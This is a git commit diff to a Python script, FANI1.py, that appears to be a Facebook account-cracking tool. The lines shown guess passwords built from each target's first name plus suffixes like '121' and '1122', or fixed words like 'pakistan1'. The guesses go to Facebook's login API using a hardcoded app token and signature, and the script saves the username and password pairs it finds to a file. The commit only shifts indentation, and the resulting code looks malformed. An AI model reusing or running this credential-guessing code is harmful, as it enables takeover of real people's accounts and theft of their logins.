99a40432182fc13395fc2f0fa250c0cd047a100c
Bahraini2130 <60524421+Bahraini2130@users.noreply.github.com>
2020-05-16 05:35:19 +0500

    Update FANI1.py

--- FANI1.py
+++ FANI1.py
@@ -392,7 +392,6 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-
 												pass6 = b['first_name']+'121'
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												q = json.load(data)
@@ -420,8 +419,7 @@ def pilih_super():
 																cek.write(user+"|"+pass7+"\n")
 																cek.close()
 																cekpoint.append(user+pass7)
-															else:
-
+												else:
 												pass8 = b['first_name']+'1122'
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												q = json.load(data)
@@ -450,8 +448,7 @@ def pilih_super():
 																cek.close()
 																cekpoint.append(user+pass9)
 															else:
-
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+														a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass10 = 'pakistan1'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
